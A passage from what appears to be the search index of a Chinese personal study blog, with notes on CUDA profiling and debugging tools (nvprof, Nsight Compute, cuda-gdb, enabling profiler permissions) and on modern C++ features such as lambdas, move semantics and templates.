controlled by the \"--devices\" option. Otherwise\n                        events will be collected on all devices.\n                        For a list of available events, use \"--query-events\".\n                        Use \"--events all\" to profile all events available for each\n                        device.\n                        Use \"--devices\" and \"--kernels\" to select a specific kernel\n                        invocation.\n --kernels &lt;kernel path syntax&gt;\n                        Change the scope of subsequent \"--events\", \"--metrics\" options.\n                        The syntax is as follows:\n                                &lt;kernel name&gt;\n                                Limit scope to given kernel name.\n                        or\n                                &lt;context id/name&gt;:&lt;stream id/name&gt;:&lt;kernel name&gt;:&lt;invocation&gt;\n                        The context/stream IDs, names, kernel name and invocation\n                        can be regular expressions. Empty string matches any number\n                        or characters. If &lt;context id/name&gt; or &lt;stream id/name&gt;\n                        is a positive number, it's strictly matched against the\n                        CUDA context/stream ID. Otherwise it's treated as a regular\n                        expression and matched against the context/stream name specified\n                        by the NVTX library. If the invocation count is a positive\n                        number, it's strictly matched against the invocation of\n                        the kernel. Otherwise it's treated as a regular expression.\n                        Example: --kernels \"1:foo:bar:2\" will profile any kernel\n                        whose name contains \"bar\" and is the 2nd instance on context\n                        1 and on stream named \"foo\".\n\n  -m,  --metrics &lt;metric names&gt;\n                        Specify the metrics to be profiled on certain device(s).\n                        Multiple metric names separated by comma can be specified.\n                        Which device(s) are profiled is controlled by the \"--devices\"\n                        option. Otherwise metrics will be collected on all devices.\n                        For a list of available metrics, use \"--query-metrics\".\n                        Use \"--metrics all\" to profile all metrics available for\n                        each device.\n                        Use \"--devices\" and \"--kernels\" to select a specific kernel\n                        invocation.\n                        Note: \"--metrics all\" does not include some metrics which\n                        are needed for Visual Profiler's source level analysis.\n                        For that, use \"--analysis-metrics\".\n\n --pc-sampling-period &lt;period&gt;\n                        Specify PC Sampling period in cycles,  at which the sampling\n                        records will be dumped. Allowed values for the period are\n                        integers between 5 to 31 both inclusive.\n                        This will set the sampling period to (2^period) cycles\n                        Default value is a number between 5 and 12 based on the setup.\n                        Note: Only available for GM20X+.\n\n --print-api-summary\n                  Print a summary of CUDA runtime/driver API calls.\n\n --print-api-trace\n                  Print CUDA runtime/driver API trace.\n\n --print-gpu-trace\n                        Print individual kernel invocations (including CUDA memcpy's/memset's)\n                        and sort them in chronological order. In event/metric profiling\n                        mode, show events/metrics for each kernel invocation.\n  -s,  --print-summary\n                        Print a summary of the profiling result on screen. Note:\n                        This is the default unless \"--export-profile\" or other print\n                        options are used.\n\n  -o,  --export-profile &lt;filename&gt;\n                        Export the result file which can be imported later or opened\n                        by the NVIDIA Visual Profiler.\n                                \"%p\" in the file name string is replaced with the\n                        process ID of the application being profiled.\n                                \"%q{&lt;ENV&gt;}\" in the file name string is replaced\n                        with the value of the environment variable \"&lt;ENV&gt;\". If the\n                        environment variable is not set it's an error.\n                                \"%h\" in the file name string is replaced with the\n                        hostname of the system.\n                                \"%%\" in the file name string is replaced with \"%\".\n                                Any other character following \"%\" is illegal.\n                        By default, this option disables the summary output. Note:\n                        If the application being profiled creates child processes,\n                        or if '--profile-all-processes' is used, the \"%p\" format\n                        is needed to get correct export files for each process.\n</code></pre> <p>metric\u5177\u4f53\u542b\u4e49\uff1a1. Preparing An Application For Profiling \u2014 Profiler 12.3 documentation (nvidia.com)</p> <p>The\u00a0Visual Profiler\u00a0is a graphical profiling tool that displays a timeline of your application\u2019s CPU and GPU activity, and that includes an automated analysis engine to identify optimization opportunities. The\u00a0nvprof\u00a0profiling tool enables you to collect and view profiling data from the command-line.</p> <p>\u4e0b\u4e00\u4ee3</p> <p>Note that Visual Profiler and nvprof will be deprecated in a future CUDA release.\u00a0The NVIDIA Volta platform is the last architecture on which these tools are fully supported. It is recommended to use next-generation tools\u00a0NVIDIA Nsight Systems\u00a0for GPU and CPU sampling and tracing and\u00a0NVIDIA Nsight Compute\u00a0for GPU kernel profiling.</p> <p>\u8fc1\u79fb\uff1a1. Preparing An Application For Profiling \u2014 Profiler 12.3 documentation (nvidia.com)</p> <ul> <li>An\u00a0event\u00a0is a countable activity, action, or occurrence on a device. It corresponds to a single hardware counter value which is collected during kernel execution. To see a list of all available events on a particular NVIDIA GPU, type\u00a0<code>nvprof\u00a0--query-events</code>.</li> <li>A\u00a0metric\u00a0is a characteristic of an application that is calculated from one or more event values. To see a list of all available metrics on a particular NVIDIA GPU, type\u00a0<code>nvprof\u00a0--query-metrics</code>. You can also refer to the\u00a0metrics reference\u00a0.</li> </ul> <p>\u652f\u6301cudaProfilerStart, Stop CUDA API\u7528\u4e8e\u4e13\u6ce8\u90e8\u5206\u4ee3\u7801\u7684\u5206\u6790\u3002nvprof\u9700\u8981\u4f7f\u7528--profile-from-start\u00a0off\u6765\u4f7f\u7528</p> <p>NVTX\u7528\u4e8e\u7ed9CPU\u4ee3\u7801\u6253\u4e0a\u6807\u8bb0\uff0c\u597d\u5728\u5de5\u5177\u91cc\u770b\u5230</p> <p>To understand what the application\u2019s CPU threads are doing outside of CUDA function calls, you can use the\u00a0NVIDIA Tools Extension API\u00a0(NVTX). When you add NVTX markers and ranges to your application, the\u00a0Timeline View\u00a0shows when your CPU threads are executing within those regions.</p> <p>The Visual Profiler is available as both a standalone application and as part of Nsight Eclipse Edition. The standalone version of the Visual Profiler,\u00a0<code>nvvp</code>, is included in the CUDA Toolkit for all supported OSes</p> <p>\u6d41\u7a0b - \u51c6\u5907\u5e94\u7528\u7a0b\u5e8f   - \u4e8c\u8fdb\u5236\u7a0b\u5e8f\uff0c\u4e0d\u7528\u4e13\u95e8\u4fee\u6539\u3002\u4f46\u662f\u4f7f\u7528NVTX\u66f4\u597d</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#nsight-compute","title":"Nsight Compute","text":"<p>Nsight Compute Documentation (nvidia.com) - Kernel Profiling Guide     - Kernel Profiling Guide with metric types and meaning, data collection modes and FAQ for common problems. - Nsight Compute     - NVIDIA Nsight Compute User Interface (UI) manual. Information on all views, controls and workflows within the tool UI. Transitions guide for Visual Profiler.  - Nsight Compute CLI     - NVIDIA Nsight Compute Command Line Interface (CLI) manual. Information on workflows and options for the command line, including multi-process profiling and NVTX filtering. Transitions guide for Nvprof.</p> <ul> <li>nvprof\uff1asm7.5 \u4e4b\u524d\u4f7f\u7528\uff0c\u88abnsight compute\u66ff\u4ee3</li> <li>Nsight compute</li> <li>\u56fe\u5f62\u5316\u754c\u9762</li> <li>\u547d\u4ee4\u884c\uff1ancu</li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#ncu","title":"ncu","text":"<p>Nsight Compute CLI :: Nsight Compute Documentation (nvidia.com)</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#metric","title":"metric","text":"<p>--metric</p> <p>Specify all metrics to be profiled, separated by comma. If no\u00a0--section\u00a0options are given, only the temporary section containing all metrics listed using this option is collected. If\u00a0--section\u00a0options are given in addition to\u00a0--metrics, all metrics from those sections and from\u00a0--metrics\u00a0are collected.</p> <p>nvprof metric\u5728ncu\u4e2d\u7684\u8868\u793a Nsight Compute CLI :: Nsight Compute Documentation (nvidia.com)</p> <pre><code>|inst_executed|smsp__inst_executed.sum|\n</code></pre>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#\u95ee\u9898","title":"\u95ee\u9898","text":"","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#profiling-is-not-supported-on-this-device","title":"Profiling is not supported on this device","text":"<p>Nsight compute\u652f\u6301\u7684GPU\uff1aRelease Notes :: Nsight Compute Documentation (nvidia.com) - \u4e0d\u652f\u6301pascal\uff08\u5982gtx1080\uff09\uff0c\u4eceVolta GV100\u5f00\u59cb\u652f\u6301</p> <p></p> <p></p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#\u65e0\u6743\u9650\u4f7f\u7528metric","title":"\u65e0\u6743\u9650\u4f7f\u7528metric","text":"<p>\u4fee\u6539/etc/modprobe.d\uff0c\u91cd\u542f\u4fdd\u6301\u4fee\u6539 <pre><code>sudo vim /etc/modprobe.d/nvidia_profile.conf\n\noptions nvidia NVreg_RestrictProfilingToAdminUsers=0\n\nupdate-initramfs -u -k all #\u66f4\u65b0initramfs, -k all\u6307\u5b9a\u6240\u6709\u5185\u6838\u7248\u672c\n</code></pre></p> <p>\u4e0d\u7528\u91cd\u542f\uff0c\u4e34\u65f6\u4fee\u6539\u65b9\u6cd5 <pre><code>modprobe -rf nvidia_uvm nvidia_drm nvidia_modeset nvidia-vgpu-vfio nvidia\n\nmodprobe nvidia NVreg_RestrictProfilingToAdminUsers=0\n</code></pre></p> <p>\u65e0\u6cd5\u79fb\u9664\u65f6\uff0c\u67e5\u770b\u662f\u4ec0\u4e48\u8fdb\u7a0b\u5360\u7528\u4e86gpu <pre><code>sudo lsof /dev/nvidia*\n</code></pre></p> <p>\u53ef\u80fd\u9700\u8981\u505c\u6b62nvidia-persistenced.service\u670d\u52a1 <pre><code>sudo systemctl status nvidia-persistenced.service\n</code></pre></p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#\u8c03\u8bd5\u5de5\u5177","title":"\u8c03\u8bd5\u5de5\u5177","text":"","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#cuda-memck","title":"cuda-memck","text":"<p>\u4f7f\u7528cuda-memcheck\u68c0\u67e5\u7a0b\u5e8f\u662f\u5426\u6709\u975e\u6cd5\u5730\u5740\u8bbf\u95ee\u3002\u4f1a\u4f7f\u5f97\u7a0b\u5e8f\u6267\u884c\u53d8\u6162 <pre><code>cuda-memcheck prog arg...\n</code></pre></p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#cuda-gdb\u8c03\u8bd5","title":"cuda-gdb\u8c03\u8bd5","text":"<pre><code>nvcc -g -G XXX.cu -o XXX # -g\u5bf9\u4e8ecpu, -G\u5bf9\u4e8eGPU\n</code></pre> <p>cuda-gdb\u548cgdb\u4f7f\u7528\u7c7b\u4f3c\u3002</p> <p>cuda\u7a0b\u5e8f\u5982\u679c\u4ee3\u7801\u5199\u9519\uff0c\u6267\u884c\u65f6\u53ea\u80fd\u4ece\u5185\u6838\u65e5\u5fd7\u4e2d\u770b\u5230\u62a5\u9519\u4fe1\u606f\uff08\u5982Xid\u62a5\u9519\uff09\uff0c\u975e\u5e38\u4e0d\u4fbf\u3002</p> <p>\u800c\u4f7f\u7528cuda-gdb\u53ef\u4ee5\u76f4\u63a5\u5b9a\u4f4d\u54ea\u51fa\u4ee3\u7801\u8bbf\u5b58\u9519\u8bef\uff1a <pre><code>(cuda-gdb) r 10 10 10                                                                                CUDA Exception: Warp Illegal Address                                                                 The exception was triggered at PC 0x55555617ff10 (GEMM.cu:82)\n\nThread 1 \"GEMM\" received signal CUDA_EXCEPTION_14, Warp Illegal Address.\n[Switching focus to CUDA kernel 0, grid 4, block (0,0,0), thread (0,6,0), device 0, sm 0, warp 6, lane 0] 0x000055555617ff20 in gemm_block_shared&lt;32, 32, 8&gt;&lt;&lt;&lt;(32,32,1),(32,32,1)&gt;&gt;&gt; (A=0x7fffbda00000, B=0x7fffd7800000, C=0x7fffd7c00000, m=1024, k=1024, n=1024) at GEMM.cu:82\n82                  Bs[ty][tx] = B(iter * bm + ty, bx * bk + tx); //(tx, ty) in block B(iter, bx)\n(cuda-gdb) quit\nA debugging session is active.\n        Inferior 1 [process 32589] will be killed.\nQuit anyway? (y or n) y\n</code></pre></p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#nvbit","title":"NVbit","text":"<p><pre><code>unsigned int __ballot(int predicate); #\n</code></pre> - If\u00a0<code>predicate</code>\u00a0is nonzero,\u00a0<code>__ballot</code>\u00a0returns a value with the\u00a0<code>N</code>th bit set, where\u00a0<code>N</code>\u00a0is the thread index.</p> <pre><code>int atomicOr(int* address, int val);\n</code></pre>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#warp-level\u6307\u4ee4","title":"warp-level\u6307\u4ee4","text":"<p>CSE 599 I Accelerated Computing - Programming GPUs Lecture 18.pdf (tschmidt23.github.io)</p> <p></p> <p></p> <p></p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#cuda-sdk","title":"cuda SDK","text":"<ul> <li> <p>HPC SDK NVIDIA HPC SDK | NVIDIA NGC Release Notes Version 23.3 (nvidia.com)</p> </li> <li> <p>HPC benchmark NVIDIA HPC-Benchmarks | NVIDIA NGC</p> </li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/","title":"C&C++","text":"<ul> <li>C++\u8bed\u8a00\u65b0\u673a\u5236\uff08\u5982\u95ed\u5305\uff0cfor_each\uff09</li> <li>C++ STL\u4f7f\u7528</li> <li>\u5bb9\u5668</li> <li>\u7b97\u6cd5\u5e93</li> <li>\u5e38\u89c1\u7b97\u6cd5\u8bb0\u5f55</li> </ul>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u73b0\u4ee3c\u6559\u7a0b","title":"\u73b0\u4ee3c++\u6559\u7a0b","text":"<p>[\u73b0\u4ee3 C++ \u6559\u7a0b: \u9ad8\u901f\u4e0a\u624b C++ 11/14/17/20 - Modern C++ Tutorial: C++ 11/14/17/20 On the Fly (changkun.de)</p> <p>\u5728\u4f20\u7edf C++ \u4e2d\uff0c\u4e0d\u540c\u7684\u5bf9\u8c61\u6709\u7740\u4e0d\u540c\u7684\u521d\u59cb\u5316\u65b9\u6cd5\uff0c\u4f8b\u5982\u666e\u901a\u6570\u7ec4\u3001 POD \uff08Plain\u00a0Old\u00a0Data\uff0c\u5373\u6ca1\u6709\u6784\u9020\u3001\u6790\u6784\u548c\u865a\u51fd\u6570\u7684\u7c7b\u6216\u7ed3\u6784\u4f53\uff09 \u7c7b\u578b\u90fd\u53ef\u4ee5\u4f7f\u7528\u00a0<code>{}</code>\u00a0\u8fdb\u884c\u521d\u59cb\u5316\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u6240\u8bf4\u7684\u521d\u59cb\u5316\u5217\u8868\u3002 \u800c\u5bf9\u4e8e\u7c7b\u5bf9\u8c61\u7684\u521d\u59cb\u5316\uff0c\u8981\u4e48\u9700\u8981\u901a\u8fc7\u62f7\u8d1d\u6784\u9020\u3001\u8981\u4e48\u5c31\u9700\u8981\u4f7f\u7528\u00a0<code>()</code>\u00a0\u8fdb\u884c\u3002</p> <p>\u5176\u6b21\uff0cC++11 \u8fd8\u63d0\u4f9b\u4e86\u7edf\u4e00\u7684\u8bed\u6cd5\u6765\u521d\u59cb\u5316\u4efb\u610f\u7684\u5bf9\u8c61\uff0c\u4f8b\u5982\uff1a <pre><code>Foo foo2 {3, 4};\n</code></pre></p> <p>decltype</p> <p>\u533a\u95f4for\u8fed\u4ee3 <pre><code>    for (auto &amp;element : vec) {  \n        element += 1;                      // writeable  \n    }  \n    for (auto element : vec)  \n        std::cout &lt;&lt; element &lt;&lt; std::endl; // read only\n</code></pre></p> <p>using \u51fd\u6570\u6307\u9488\u683c\u5f0f\u66f4\u7b80\u5355 <pre><code>typedef int (*process)(void *);  \nusing NewProcess = int(*)(void *);\n</code></pre></p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#c\u8bed\u8a00\u65b0\u7279\u6027","title":"C++\u8bed\u8a00\u65b0\u7279\u6027","text":"<p>\u9ed8\u8ba4\u4e3ac++11\uff0c\u5176\u5b83\u6807\u51c6\u7279\u6027\u4f1a\u663e\u793a\u8bf4\u660e\u3002</p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#tamplate","title":"tamplate","text":"<p>\u7528\u4e8e\u8868\u793a\u4e00\u822c\u7c7b\u578b\u7684\u51fd\u6570\uff0c\u7c7b\u3002\u7f16\u8bd1\u65f6\u6839\u636e\u9700\u8981\u751f\u6210\u5bf9\u5e94\u7c7b\u578b\u7684\u5b9e\u4f8b\u3002 - \u51fd\u6570\u6a21\u677f - \u7c7b\u6a21\u677f</p> <pre><code>template &lt;class identifier&gt; function_declaration;  \ntemplate &lt;typename identifier&gt; function_declaration;\n</code></pre> <p><code>class</code>\u548c<code>typename</code>\u6548\u679c\u662f\u5b8c\u5168\u4e00\u6837\u7684\u3002</p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u7c7b\u578b\u8f6c\u6362cast","title":"\u7c7b\u578b\u8f6c\u6362cast","text":"<ul> <li>C \u8bed\u8a00\u98ce\u683c\u7684\u7c7b\u578b\u8f6c\u6362\u88ab\u5f03\u7528\uff08\u5373\u5728\u53d8\u91cf\u524d\u4f7f\u7528\u00a0<code>(convert_type)</code>\uff09\uff0c\u5e94\u8be5\u4f7f\u7528\u00a0<code>static_cast</code>\u3001<code>reinterpret_cast</code>\u3001<code>const_cast</code>\u00a0\u6765\u8fdb\u884c\u7c7b\u578b\u8f6c\u6362\u3002`**</li> </ul> <pre><code>int * i_p = static_cast&lt;int *&gt;(p);\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#lambda\u8868\u8fbe\u5f0f","title":"lambda\u8868\u8fbe\u5f0f","text":"<ul> <li>lambda = \u533f\u540d\u51fd\u6570</li> <li>\u95ed\u5305 = \u6355\u83b7\u4e86local scope\u5916\u53d8\u91cf\u7684lambda\u51fd\u6570</li> </ul> <p>Lambda expressions (since C++11) - cppreference.com</p> <pre><code>[\u6355\u83b7\u5217\u8868](\u53c2\u6570\u5217\u8868) mutable(\u53ef\u9009) \u5f02\u5e38\u5c5e\u6027 -&gt; \u8fd4\u56de\u7c7b\u578b {  \n// \u51fd\u6570\u4f53  \n}\n</code></pre> <p>\u9690\u5f0f\u6355\u83b7 - <code>[]</code>\u7a7a\u6355\u83b7\u5217\u8868 - <code>[name1, name2, ...]</code>\u6355\u83b7\u4e00\u7cfb\u5217\u53d8\u91cf - <code>[&amp;]</code>\u5f15\u7528\u6355\u83b7, \u8ba9\u7f16\u8bd1\u5668\u81ea\u884c\u63a8\u5bfc\u5f15\u7528\u5217\u8868 - <code>[=]</code>\u503c\u6355\u83b7, \u8ba9\u7f16\u8bd1\u5668\u81ea\u884c\u63a8\u5bfc\u503c\u6355\u83b7\u5217\u8868 \u8868\u8fbe\u5f0f\u6355\u83b7</p> <p>\u4e0a\u9762\u63d0\u5230\u7684\u503c\u6355\u83b7\u3001\u5f15\u7528\u6355\u83b7\u90fd\u662f\u5df2\u7ecf\u5728\u5916\u5c42\u4f5c\u7528\u57df\u58f0\u660e\u7684\u53d8\u91cf\uff0c\u56e0\u6b64\u8fd9\u4e9b\u6355\u83b7\u65b9\u5f0f\u6355\u83b7\u7684\u5747\u4e3a\u5de6\u503c\uff0c\u800c\u4e0d\u80fd\u6355\u83b7\u53f3\u503c\u3002 <pre><code>#include &lt;iostream&gt;  \n#include &lt;memory&gt;  // std::make_unique  \n#include &lt;utility&gt; // std::move  \n\nvoid lambda_expression_capture() {  \n    auto important = std::make_unique&lt;int&gt;(1);  \n    auto add = [v1 = 1, v2 = std::move(important)](int x, int y) -&gt; int {  \n        return x+y+v1+(*v2);  \n    };  \n    std::cout &lt;&lt; add(3,4) &lt;&lt; std::endl;  \n}\n</code></pre></p> <p>\u6cdb\u578blambda <pre><code>auto add = [](auto x, auto y) {  \n    return x+y;  \n};  \n\nadd(1, 2);  \nadd(1.1, 2.2);\n</code></pre></p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u9012\u5f52","title":"\u9012\u5f52","text":"<ul> <li>\u5fc5\u987b[&amp;]\uff0c\u56e0\u4e3a\u51fd\u6570\u5b9a\u4e49\u5728\u51fd\u6570\u4f53\u5916\uff0c\u9700\u8981\u4f7f\u7528\u95ed\u5305\u6293\u53d6\u3002</li> <li>\u4e0d\u80fd\u4f7f\u7528auto\uff0c\u9700\u8981\u4f7f\u7528function\u5b9a\u4e49\u3002\u56e0\u4e3aauto\u9700\u8981\u6839\u636e\u51fd\u6570\u5185\u5bb9\u63a8\u65ad\uff0c\u800c\u95ed\u5305\u53c8\u9700\u8981\u5f15\u7528\u5916\u90e8\u51fd\u6570\u5b9a\u4e49\u3002</li> </ul> <pre><code>#include &lt;functional&gt;\n// Function &lt; return type (parameter types) &gt; functionName\n\nfunction&lt;int(int)&gt; f = [&amp;](int i) {\n    if (i == 0)\n        return 1;\n    return f(i - 1) * i;\n}\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u53f3\u503c\u5f15\u7528","title":"\u53f3\u503c\u5f15\u7528","text":"<p>\u4f20\u7edf C++ \u901a\u8fc7\u62f7\u8d1d\u6784\u9020\u51fd\u6570\u548c\u8d4b\u503c\u64cd\u4f5c\u7b26\u4e3a\u7c7b\u5bf9\u8c61\u8bbe\u8ba1\u4e86\u62f7\u8d1d/\u590d\u5236\u7684\u6982\u5ff5\uff0c\u4f46\u4e3a\u4e86\u5b9e\u73b0\u5bf9\u8d44\u6e90\u7684\u79fb\u52a8\u64cd\u4f5c\uff0c \u8c03\u7528\u8005\u5fc5\u987b\u4f7f\u7528\u5148\u590d\u5236\u3001\u518d\u6790\u6784\u7684\u65b9\u5f0f\uff0c\u5426\u5219\u5c31\u9700\u8981\u81ea\u5df1\u5b9e\u73b0\u79fb\u52a8\u5bf9\u8c61\u7684\u63a5\u53e3\u3002 \u8bd5\u60f3\uff0c\u642c\u5bb6\u7684\u65f6\u5019\u662f\u628a\u5bb6\u91cc\u7684\u4e1c\u897f\u76f4\u63a5\u642c\u5230\u65b0\u5bb6\u53bb\uff0c\u800c\u4e0d\u662f\u5c06\u6240\u6709\u4e1c\u897f\u590d\u5236\u4e00\u4efd\uff08\u91cd\u4e70\uff09\u518d\u653e\u5230\u65b0\u5bb6\u3001 \u518d\u628a\u539f\u6765\u7684\u4e1c\u897f\u5168\u90e8\u6254\u6389\uff08\u9500\u6bc1\uff09\uff0c\u8fd9\u662f\u975e\u5e38\u53cd\u4eba\u7c7b\u7684\u4e00\u4ef6\u4e8b\u60c5\u3002</p> <p>\u4f20\u7edf\u7684 C++ \u6ca1\u6709\u533a\u5206\u300e\u79fb\u52a8\u300f\u548c\u300e\u62f7\u8d1d\u300f\u7684\u6982\u5ff5\uff0c\u9020\u6210\u4e86\u5927\u91cf\u7684\u6570\u636e\u62f7\u8d1d\uff0c\u6d6a\u8d39\u65f6\u95f4\u548c\u7a7a\u95f4\u3002 \u53f3\u503c\u5f15\u7528\u7684\u51fa\u73b0\u6070\u597d\u5c31\u89e3\u51b3\u4e86\u8fd9\u4e24\u4e2a\u6982\u5ff5\u7684\u6df7\u6dc6\u95ee\u9898\uff0c\u4f8b\u5982\uff1a</p> <pre><code>#include &lt;iostream&gt;  \nclass A {  \npublic:  \n    int *pointer;  \n    A():pointer(new int(1)) {  \n        std::cout &lt;&lt; \"\u6784\u9020\" &lt;&lt; pointer &lt;&lt; std::endl;  \n    }  \n    A(A&amp; a):pointer(new int(*a.pointer)) {  \n        std::cout &lt;&lt; \"\u62f7\u8d1d\" &lt;&lt; pointer &lt;&lt; std::endl;  \n    } // \u65e0\u610f\u4e49\u7684\u5bf9\u8c61\u62f7\u8d1d  \n    A(A&amp;&amp; a):pointer(a.pointer) {  \n        a.pointer = nullptr;  \n        std::cout &lt;&lt; \"\u79fb\u52a8\" &lt;&lt; pointer &lt;&lt; std::endl;  \n    }  \n    ~A(){  \n        std::cout &lt;&lt; \"\u6790\u6784\" &lt;&lt; pointer &lt;&lt; std::endl;  \n        delete pointer;  \n    }  \n};  \n// \u9632\u6b62\u7f16\u8bd1\u5668\u4f18\u5316  \nA return_rvalue(bool test) {  \n    A a,b;  \n    if(test) return a; // \u7b49\u4ef7\u4e8e static_cast&lt;A&amp;&amp;&gt;(a);  \n    else return b;     // \u7b49\u4ef7\u4e8e static_cast&lt;A&amp;&amp;&gt;(b);  \n}  \nint main() {  \n    A obj = return_rvalue(false);  \n    std::cout &lt;&lt; \"obj:\" &lt;&lt; std::endl;  \n    std::cout &lt;&lt; obj.pointer &lt;&lt; std::endl;  \n    std::cout &lt;&lt; *obj.pointer &lt;&lt; std::endl;  \n    return 0;  \n}\n</code></pre> <ol> <li>\u9996\u5148\u4f1a\u5728\u00a0<code>return_rvalue</code>\u00a0\u5185\u90e8\u6784\u9020\u4e24\u4e2a\u00a0<code>A</code>\u00a0\u5bf9\u8c61\uff0c\u4e8e\u662f\u83b7\u5f97\u4e24\u4e2a\u6784\u9020\u51fd\u6570\u7684\u8f93\u51fa\uff1b</li> <li>\u51fd\u6570\u8fd4\u56de\u540e\uff0c\u4ea7\u751f\u4e00\u4e2a\u5c06\u4ea1\u503c\uff0c\u88ab\u00a0<code>A</code>\u00a0\u7684\u79fb\u52a8\u6784\u9020\uff08<code>A(A&amp;&amp;)</code>\uff09\u5f15\u7528\uff0c\u4ece\u800c\u5ef6\u957f\u751f\u547d\u5468\u671f\uff0c\u5e76\u5c06\u8fd9\u4e2a\u53f3\u503c\u4e2d\u7684\u6307\u9488\u62ff\u5230\uff0c\u4fdd\u5b58\u5230\u4e86\u00a0<code>obj</code>\u00a0\u4e2d\uff0c\u800c\u5c06\u4ea1\u503c\u7684\u6307\u9488\u88ab\u8bbe\u7f6e\u4e3a\u00a0<code>nullptr</code>\uff0c\u9632\u6b62\u4e86\u8fd9\u5757\u5185\u5b58\u533a\u57df\u88ab\u9500\u6bc1\u3002</li> </ol> <pre><code>#include &lt;iostream&gt; // std::cout  \n#include &lt;utility&gt; // std::move  \n#include &lt;vector&gt; // std::vector  \n#include &lt;string&gt; // std::string  \n\nint main() {  \n\n    std::string str = \"Hello world.\";  \n    std::vector&lt;std::string&gt; v;  \n\n    // \u5c06\u4f7f\u7528 push_back(const T&amp;), \u5373\u4ea7\u751f\u62f7\u8d1d\u884c\u4e3a  \n    v.push_back(str);  \n    // \u5c06\u8f93\u51fa \"str: Hello world.\"  \n    std::cout &lt;&lt; \"str: \" &lt;&lt; str &lt;&lt; std::endl;  \n\n    // \u5c06\u4f7f\u7528 push_back(const T&amp;&amp;), \u4e0d\u4f1a\u51fa\u73b0\u62f7\u8d1d\u884c\u4e3a  \n    // \u800c\u6574\u4e2a\u5b57\u7b26\u4e32\u4f1a\u88ab\u79fb\u52a8\u5230 vector \u4e2d\uff0c\u6240\u4ee5\u6709\u65f6\u5019 std::move \u4f1a\u7528\u6765\u51cf\u5c11\u62f7\u8d1d\u51fa\u73b0\u7684\u5f00\u9500  \n    // \u8fd9\u6b65\u64cd\u4f5c\u540e, str \u4e2d\u7684\u503c\u4f1a\u53d8\u4e3a\u7a7a  \n    v.push_back(std::move(str));  \n    // \u5c06\u8f93\u51fa \"str: \"  \n    std::cout &lt;&lt; \"str: \" &lt;&lt; str &lt;&lt; std::endl;  \n\n    return 0;  \n}\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u5c0f\u6280\u5de7","title":"\u5c0f\u6280\u5de7","text":"","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#pair\u89e3\u5305","title":"pair\u89e3\u5305","text":"<p>\u9700\u8981c++17 <pre><code>queue&lt;pair&lt;int, int&gt;&gt; q;\nauto [tmp_id, val] = q.front();\n</code></pre></p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u591a\u5143swap","title":"\u591a\u5143swap","text":"<p>48. \u65cb\u8f6c\u56fe\u50cf - \u529b\u6263\uff08LeetCode\uff09 - \u5c064\u4e2a\u5143\u7d20\u5faa\u73af\u5de6\u79fb <pre><code>tie(matrix[i][j], matrix[n - j - 1][i], matrix[n - i - 1][n - j - 1], matrix[j][n - i - 1]) \\\n                    = make_tuple(matrix[n - j - 1][i], matrix[n - i - 1][n - j - 1], matrix[j][n - i - 1], 